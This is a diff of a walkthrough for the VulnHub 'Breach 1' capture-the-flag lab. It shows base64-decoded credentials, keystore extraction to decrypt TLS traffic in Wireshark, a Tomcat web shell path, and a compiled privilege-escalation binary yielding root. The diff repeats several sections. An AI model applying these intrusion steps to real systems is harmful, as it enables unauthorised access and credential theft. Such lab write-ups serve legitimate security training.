@@ -1,3 +1,4 @@
+
 <https://unit42.paloaltonetworks.com/wireshark-tutorial-decrypting-https-traffic/>
 
 <https://medium.com/@erictee2012/vulnhub-writeup-breach-1-94472f5afd3f>
@@ -6,6 +7,8 @@
 
 <https://github.com/drk1wi/portspoof>
     
+
+# Web service on port 80
 
 
 Keys: impresscms, Java KeyStore, keytool, openssl, burp suite, tomcat, sudo -l, decrypting https traffic, wireshark, portspoof
@@ -21,8 +24,6 @@ Keys: impresscms, Java KeyStore, keytool, openssl, burp suite, tomcat, sudo -l, 
     </head>
 
 
-
-
     <body bgcolor="#000000">
 
     <font color="green">
@@ -33,6 +34,13 @@ Keys: impresscms, Java KeyStore, keytool, openssl, burp suite, tomcat, sudo -l, 
 
     <center><a href="initech.html" target="_blank"> <img src="/images/milton_beach.jpg" 
     width=500 height=500> </a></center>
+
+    <p>Little did the company realize that the breach was not the work of skilled hackers, but a parting gift from a disgruntled former employee on his way out. The TOP consultants have been hard at work containing the breach. 
+    However, their own work ethics and the mess left behind may be the company's downfall.</p>
+
+    <center><a href="initech.html" target="_blank"> <img src="/images/milton_beach.jpg" 
+    width=500 height=500> </a></center>
+
 
 
     <!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo ----->
@@ -66,10 +74,39 @@ Keys: impresscms, Java KeyStore, keytool, openssl, burp suite, tomcat, sudo -l, 
     Image Size                      : 610x327
     Megapixels                      : 0.199                                                                
 
+
+## Decode the code
+
+    $ wget http://192.168.56.110/images/bill.png
+    $ exiftool bill.png
+    ExifTool Version Number         : 12.16
+    File Name                       : bill.png
+    Directory                       : .
+    File Size                       : 315 KiB
+    File Modification Date/Time     : 2016:06:05 01:35:33+02:00
+    File Access Date/Time           : 2021:04:12 07:43:03+02:00
+    File Inode Change Date/Time     : 2021:04:12 07:42:57+02:00
+    File Permissions                : rw-r--r--
+    File Type                       : PNG
+    File Type Extension             : png
+    MIME Type                       : image/png
+    Image Width                     : 610
+    Image Height                    : 327
+    Bit Depth                       : 8
+    Color Type                      : RGB with Alpha
+    Compression                     : Deflate/Inflate
+    Filter                          : Adaptive
+    Interlace                       : Noninterlaced
+    Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
+    Comment                         : coffeestains  <== HERE
+    Image Size                      : 610x327
+    Megapixels                      : 0.199                                                                
+
 ## Decode the code
 
     $ echo Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo | base64 -d | base64 -d
     pgibbons:damnitfeel$goodtobeagang$ta
+
 
 ## Connect to impresscms with pgibbons:damnitfeel$goodtobeagang$ta
 
@@ -111,6 +148,80 @@ Keys: impresscms, Java KeyStore, keytool, openssl, burp suite, tomcat, sudo -l, 
 ## Extract the certificate from the keystore.
 
     $ keytool -list -keystore keystore                                                                                          
+
+> Posting sensitive content
+> 
+> Peter, yeahhh, I'm going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that'd be great. -Bill
+> 
+> -- 
+> 
+> IDS/IPS system
+> 
+> Hey Peter,
+> 
+> I got a really good deal on an IDS/IPS system from a vendor I met at that happy hour at Chotchkie's last week!
+> 
+> -Michael
+> 
+> --
+> 
+> FWD: Thank you for your purchase of Super Secret Cert Pro!
+> 
+> Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob 
+> 
+> 
+> SSL implementation test capture
+> Published by Peter Gibbons on 2016/6/4 21:37:05. (0 reads)
+> Team - I have uploaded a pcap file of our red team's re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. http://192.168.110.140/impresscms/_SSL_test_phase1.pcap They told me the alias, storepassword and keypassword are all set to 'tomcat'. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I'm going fishing for the next 2 days and will not have access to email or phone.
+
+
+==> Found keystore at http://192.168.56.140/.keystore
+
+==> Found pcap file at http://192.168.56.140/impresscms/_SSL_test_phase1.pcap
+
+# Keytool
+
+## Extract the certificate from the keystore.
+
+    $ keytool -list -keystore keystore                                                                                          
+    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+    Enter keystore password:  tomcat
+    Keystore type: JKS
+    Keystore provider: SUN
+
+    Your keystore contains 1 entry
+
+    tomcat, May 20, 2016, PrivateKeyEntry, 
+    Certificate fingerprint (SHA-256): F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31
+
+    Warning:
+    The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using "keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12".
+
+
+    $ keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12                                
+    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+    Enter source keystore password:  tomcat
+    Entry for alias tomcat successfully imported.
+    Import command completed:  1 entries successfully imported, 0 entries failed or cancelled
+
+    Warning:
+    Migrated "keystore" to PKCS12. The JKS keystore is backed up as "keystore.old".
+
+
+
+Decode pcap file with wireshark with the key _keystore_  (Edit --> Preferences --> Protocols --> TLS --> RSA keys list, Edit --> IP address : 192.168.110.140, Port : 8443, Protocol :http, Key file : _keystore_, Password : tomcat
+
+
+    /_M@nag3Me/html/shell
+
+    $ echo dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | base64 -d
+    tomcat:Tt\5D8F(#!*u=G)4m7zB
+
+
+## tomcat certificate keystore
+
+    $ keytool -list -v -keystore keystore.old 
+
     Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
     Enter keystore password:  tomcat
     Keystore type: JKS
@@ -201,7 +312,7 @@ Decode pcap file with wireshark with the key _keystore_  (Edit --> Preferences -
     Enter source keystore password:  
     [Storing myp12file.p12]
 
-### check the private key
+## check the private key
 
     $ openssl pkcs12 -in myp12file.p12 -nocerts -nodes                                                                           
     Enter Import Password:
@@ -311,9 +422,9 @@ Decode pcap file with wireshark with the key _keystore_  (Edit --> Preferences -
 
     bash-4.3# gcc b.c -o b
     ./b
-    root@Breach:~# id
-    
+    root@Breach:~# id    
     uid=0(root) gid=0(root) groups=0(root),1001(blumbergh)
+
 
 
 # Box's configuration
@@ -327,7 +438,10 @@ Decode pcap file with wireshark with the key _keystore_  (Edit --> Preferences -
     tcp6       0      0 :::8443                 :::*                    LISTEN      1174/java       
     tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      1174/java       
 
+    cat portly.sh
+    #!/bin/bash
 
+    iptables -t nat -A PREROUTING -p tcp --match multiport --dport 1:79,81:8442,8444:65535 -j REDIRECT --to-ports 4444 && /usr/local/bin/portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures -D
 
     cat portly.sh
     #!/bin/bash
